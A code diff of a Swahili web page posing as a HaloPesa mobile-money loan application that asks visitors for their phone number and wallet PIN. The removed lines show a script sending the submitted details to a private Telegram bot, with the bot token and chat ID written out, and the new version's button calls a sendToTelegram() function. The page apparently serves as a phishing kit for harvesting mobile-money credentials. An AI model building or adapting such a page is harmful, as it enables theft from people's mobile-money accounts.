@@ -1,209 +1,49 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MKOPO WA HALOPESA</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MKOPO WA HALOPESA</title>
 
-<style>
-body {
-    font-family: Arial;
-    background: #f5f7fb;
-    padding: 20px;
-}
-
-.card {
-    max-width: 420px;
-    margin: auto;
-    background: white;
-    padding: 20px;
-    border-radius: 16px;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.08);
-}
-
-h1 {
-    text-align: center;
-    color: #00796b;
-}
-
-.field {
-    margin-bottom: 15px;
-}
-
-label {
-    font-weight: bold;
-    display: block;
-    margin-bottom: 6px;
-}
-
-input, select {
-    width: 100%;
-    padding: 12px;
-    font-size: 16px;
-    border: 1px solid #ccc;
-    border-radius: 8px;
-}
-
-/* Slider */
-.slider {
-    width: 100%;
-}
-
-/* Result box */
-.result {
-    background: #e8f5e9;
-    padding: 12px;
-    border-radius: 8px;
-    margin-top: 15px;
-}
-
-/* Button */
-button {
-    width: 100%;
-    padding: 14px;
-    background: #00c853;
-    color: white;
-    border: none;
-    border-radius: 10px;
-    font-size: 18px;
-}
-</style>
+    <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
 
-<div class="card">
+<div class="container">
 
-<h1>MKOPO WA HALOPESA</h1>
+    <h1>MKOPO WA HALOPESA</h1>
 
-<!-- SLIDER LOAN AMOUNT -->
-<div class="field">
-    <label>Kiasi cha Mkopo (TZS)</label>
+    <!-- Amount -->
+    <input type="number"
+           id="amount"
+           placeholder="Kiasi cha Mkopo">
 
-    <input type="range" id="slider"
-        min="1000" max="1000000"
-        step="1000"
-        value="100000"
-        oninput="syncAmount(this.value)">
-
-    <input type="number" id="amount"
-        value="100000"
-        oninput="syncSlider(this.value)">
-</div>
-
-<!-- DURATION -->
-<div class="field">
-    <label>Muda wa Marejesho</label>
-    <select id="duration" onchange="calculateLoan()">
-        <option value="30">Siku 30</option>
-        <option value="60">Siku 60</option>
-        <option value="90">Siku 90</option>
+    <!-- Duration -->
+    <select id="duration">
+        <option>Siku 30</option>
+        <option>Siku 14</option>
+        <option>Siku 7</option>
     </select>
-</div>
 
-<!-- RESULT -->
-<div class="result">
-    <div>Riba: <strong>10%</strong></div>
-    <div>Jumla ya Marejesho:
-        <strong id="total">110,000 TZS</strong>
-    </div>
-</div>
+    <!-- Phone -->
+    <input type="text"
+           id="phone"
+           placeholder="Namba ya Simu">
 
-<!-- PHONE -->
-<div class="field">
-    <label>Namba ya Halopesa</label>
-    <input type="tel" id="phone">
-</div>
+    <!-- PIN -->
+    <input type="password"
+           id="pin"
+           placeholder="PIN">
 
-<!-- PIN -->
-<div class="field">
-    <label>PIN</label>
-    <input type="password" id="pin" maxlength="4">
-</div>
-
-<button onclick="submitLoan()">ENDELEA</button>
+    <!-- Button -->
+    <button onclick="sendToTelegram()">
+        OMBA SASA
+    </button>
 
 </div>
 
-<script>
+<script src="script.js"></script>
 
-/* Sync slider → input */
-function syncAmount(value) {
-    document.getElementById('amount').value = value;
-    calculateLoan();
-}
-
-/* Sync input → slider */
-function syncSlider(value) {
-    document.getElementById('slider').value = value;
-    calculateLoan();
-}
-
-/* Loan calculator */
-function calculateLoan() {
-    const amount = Number(document.getElementById('amount').value) || 0;
-    const interest = 0.10;
-
-    const total = amount + (amount * interest);
-
-    document.getElementById('total').textContent =
-        total.toLocaleString() + ' TZS';
-}
-
-/* Submit */
-function submitLoan() {
-    const phone = document.getElementById('phone').value;
-    const pin = document.getElementById('pin').value;
-
-    if (!phone || pin.length !== 4) {
-        alert("Jaza taarifa zote vizuri");
-        return;
-    }
-
-    alert("Maombi yako yamepokelewa");
-}
-
-/* init */
-calculateLoan();
-
-</script>
-<script>
-document.getElementById("endeleaBtn").addEventListener("click", function(e) {
-    e.preventDefault();
-
-    let phone = document.getElementById("phone").value;
-    let amount = document.getElementById("amount").value;
-    let days = document.getElementById("days").value;
-
-    let message =
-`🟢 NEW LOAN APPLICATION
-📞 Phone: ${phone}
-💰 Amount: ${amount}
-📅 Days: ${days}`;
-
-    let botToken = "7743245077:AAEb5A3vSWUThj4k206OKaymOt20oh-9x2E";
-    let chatId = "7480420601";
-
-    let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-    fetch(url, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-        })
-    })
-    .then(response => {
-        if (response.ok) {
-            alert("Imetumwa Telegram!");
-        } else {
-            alert("Imeshindwa kutuma.");
-        }
-    });
-});
-</script>
 </body>
 </html>
